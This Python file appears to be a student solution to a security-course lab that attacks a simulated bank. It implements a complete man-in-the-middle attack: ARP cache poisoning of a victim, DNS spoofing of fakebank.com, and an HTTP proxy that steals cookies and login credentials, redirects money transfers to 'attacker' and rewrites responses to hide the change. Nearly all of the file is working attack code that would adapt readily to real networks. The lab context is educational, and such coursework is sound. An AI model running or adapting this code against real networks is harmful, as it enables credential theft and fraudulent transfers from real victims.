import http.server
import time
from http.cookies import SimpleCookie
from urllib.parse import parse_qs, urlencode

from scapy.all import ARP, DNS, DNSQR, DNSRR, Ether, IP, UDP

import cs130
from network import config


def poison_arp():
    # Target values specified by the manual configuration rules
    victim_mac = "02:00:00:00:00:04"
    victim_ip = "10.38.8.4"
    
    # Construct an ARP "is-at" (op=2) reply packet mapping the DNS IP to our local MAC
    pkt = (Ether(src=cs130.get_local_mac(), dst=victim_mac) / 
           ARP(op=2, 
               hwsrc=cs130.get_local_mac(), 
               psrc=cs130.get_dns_ip(), 
               hwdst=victim_mac, 
               pdst=victim_ip))
           
    while True:
        # Send the packet using the required helper utility loop
        cs130.sendp(pkt)
        time.sleep(1)


# Stage 2: DNS spoofing
def _dns_spoof(pkt):
    # Check if the packet is an inbound DNS query (qr == 0)
    if DNS in pkt and pkt[DNS].qr == 0:
        qname = pkt[DNS].qd.qname
        
        # Verify the target domain request profile match
        if b"fakebank.com" in qname:
            # Flip the addressing perspective from the original request configuration
            reply = (Ether(src=cs130.get_local_mac(), dst=pkt[Ether].src) /
                     IP(src=cs130.get_local_ip(), dst=pkt[IP].src) /
                     UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                     DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd, 
                         an=DNSRR(rrname=qname, rdata=cs130.get_local_ip())))
                     
            cs130.sendp(reply)


# Stage 3: HTTP relay and rewrite
class MITMHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self): self._handle()
    def do_POST(self): self._handle()

    def _handle(self):
        # Read the incoming request from Sabrina.
        length = int(self.headers.get("Content-Length", "0") or 0)
        body = self.rfile.read(length) if length else b""

        # Log every cookie Sabrina sent dynamically
        cookie_header = self.headers.get("Cookie", "")
        ck = SimpleCookie()
        ck.load(cookie_header)
        for name, morsel in ck.items():
            cs130.steal_client_cookie(name, morsel.value)

        # Intercept parameters based on URI matching contexts
        original_to = None
        if self.path == "/login" and self.command == "POST":
            form = parse_qs(body.decode("utf-8"))
            if "username" in form and "password" in form:
                cs130.steal_credentials(form["username"][0], form["password"][0])
                
        elif self.path == "/transfer" and self.command == "POST":
            form = parse_qs(body.decode("utf-8"))
            if "to" in form:
                original_to = form["to"][0]
                form["to"] = ["attacker"]
                # Re-encode modified post structure back to key-value string bytes
                body = urlencode({k: v[0] for k, v in form.items()}).encode("utf-8")

        # Forward the modified request to the real bank.
        conn = cs130.HTTPConnection(cs130.get_bank_ip(), 80, timeout=10)
        fwd_headers = {k: v for k, v in self.headers.items()
                       if k.lower() not in ("host", "content-length")}
        fwd_headers["Host"] = config.BANK_HOSTNAME
        fwd_headers["Content-Length"] = str(len(body))
        conn.request(self.command, self.path, body=body, headers=fwd_headers)
        resp = conn.getresponse()
        resp_body = resp.read()
        resp_headers = [(k, v) for k, v in resp.getheaders()
                        if k.lower() not in ("transfer-encoding",
                                             "content-length", "connection")]

        # Log server cookies on inbound configurations
        for k, v in resp.getheaders():
            if k.lower() == "set-cookie":
                pair = v.split(";")[0]
                if "=" in pair:
                    name, val = pair.split("=", 1)
                    cs130.steal_server_cookie(name.strip(), val.strip())

        # Patch response body string configurations to hide modifications
        if self.path == "/transfer" and original_to:
            resp_body_str = resp_body.decode("utf-8", errors="ignore")
            resp_body_str = resp_body_str.replace("attacker", original_to)
            resp_body = resp_body_str.encode("utf-8")

        # Send the response back to Sabrina.
        self.send_response(resp.status)
        for k, v in resp_headers:
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(resp_body)))
        self.end_headers()
        self.wfile.write(resp_body)
        conn.close()


# main (do not modify)
def main():
    cs130.run_mitm(poison_arp, _dns_spoof, MITMHandler)


if __name__ == "__main__":
    main()